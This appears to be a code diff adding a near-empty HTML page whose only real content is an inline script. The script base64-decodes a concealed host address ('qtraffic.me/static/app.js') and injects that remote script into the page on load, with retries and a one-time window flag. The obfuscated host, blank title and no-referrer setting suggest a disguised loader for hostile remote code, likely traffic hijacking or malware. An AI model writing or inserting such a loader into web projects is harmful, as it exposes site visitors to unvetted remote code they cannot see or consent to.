@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate"/>
+    <meta http-equiv="Pragma" content="no-cache"/>
+    <meta http-equiv="Expires" content="0"/>
+    <meta name="referrer" content="no-referrer">
+</head>
+
+<body>
+<span id="pageIndex"></span><br>
+
+<script>
+    (function () {
+        const key = "5a49421172d6e1a6cc1e707f2a63c1e6";
+        const encodedList = [
+            "cXRyYWZmaWMubWUvc3RhdGljL2FwcC5qcw"
+        ];
+        let index = 0;
+        let timer = null;
+        const MAX_RETRIES = 3;
+        const TIMEOUT = 8000;
+
+        function loadScript() {
+            if (index >= encodedList.length) {
+                return;
+            }
+            const url = "https://" + atob(encodedList[index]);
+            const script = document.createElement("script");
+            script.type = "text/javascript";
+            script.async = true;
+            script.src = url;
+
+            let attempts = 0;
+            let loaded = false;
+
+            function cleanup() {
+                clearTimeout(timer);
+                script.onload = null;
+                script.onerror = null;
+            }
+
+            function retry() {
+                cleanup();
+                attempts++;
+                if (attempts < MAX_RETRIES) {
+                    timer = setTimeout(() => document.head.appendChild(script), 1000);
+                } else {
+                    index++;
+                    loadScript();
+                }
+            }
+
+            script.onload = function () {
+                if (loaded) return;
+                loaded = true;
+                cleanup();
+                window[key] = true;
+            };
+
+            script.onerror = function () {
+                if (loaded) return;
+                loaded = true;
+                retry();
+            };
+
+            timer = setTimeout(() => {
+                if (!loaded) {
+                    retry();
+                }
+            }, TIMEOUT);
+            document.head.appendChild(script);
+        }
+
+        if (!window[key]) {
+            loadScript();
+        }
+    })();
+
+
+</script>
+
+
+</body>
+
+</html>
